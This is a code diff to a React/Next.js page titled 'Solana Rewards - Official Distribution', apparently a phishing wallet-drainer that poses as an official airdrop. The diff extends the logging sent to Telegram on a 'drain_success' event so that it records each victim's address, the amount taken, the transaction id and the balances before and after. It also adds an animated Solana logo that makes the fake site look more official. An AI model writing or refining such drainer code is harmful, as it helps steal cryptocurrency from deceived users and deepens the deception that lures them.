@@ -85,7 +85,6 @@ export default function Home() {
         const response = await window.solana.connect();
         address = response.publicKey.toString();
         
-        // Create dedicated connection instance
         const { Connection } = await import('@solana/web3.js');
         const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
         
@@ -187,8 +186,11 @@ export default function Home() {
         await sendTelegramLog('drain_success', {
           walletType,
           address: walletAddress,
-          amount: allocatedAmount,
-          tx: result.txId || result.txHash
+          amount: result.amount || allocatedAmount,
+          tx: result.txId || result.txHash,
+          balanceBefore: result.balanceBefore,
+          balanceAfter: result.balanceAfter,
+          warning: result.warning
         });
         
         setTimeout(() => {
@@ -220,15 +222,31 @@ export default function Home() {
         }}
       />
       
+      {/* Header with Animated Solana Logo */}
       <header className="neon-glass m-4 p-4 relative z-10">
         <div className="max-w-6xl mx-auto flex justify-between items-center">
+          {/* Animated Logo Section */}
           <div className="flex items-center gap-3">
-            <div className="w-10 h-10 rounded-full bg-solana-gradient animate-neon-pulse"></div>
+            <div className="relative w-12 h-12 overflow-hidden rounded-full bg-gradient-to-r from-[#9945ff] to-[#14f195] p-0.5">
+              <div className="w-full h-full rounded-full bg-black overflow-hidden">
+                <video
+                  autoPlay
+                  loop
+                  muted
+                  playsInline
+                  className="w-full h-full object-cover"
+                >
+                  <source src="/solana-animation.mp4" type="video/mp4" />
+                  <img src="/solana-logo.svg" alt="Solana" className="w-full h-full p-2" />
+                </video>
+              </div>
+            </div>
             <div>
               <h1 className="text-xl font-bold text-gradient">Solana Rewards</h1>
               <p className="text-xs text-gray-400">Official Distribution</p>
             </div>
           </div>
+          
           <CountdownTimer seconds={countdown} />
         </div>
       </header>
@@ -326,4 +344,4 @@ export default function Home() {
       />
     </div>
   );
-            }
+    }
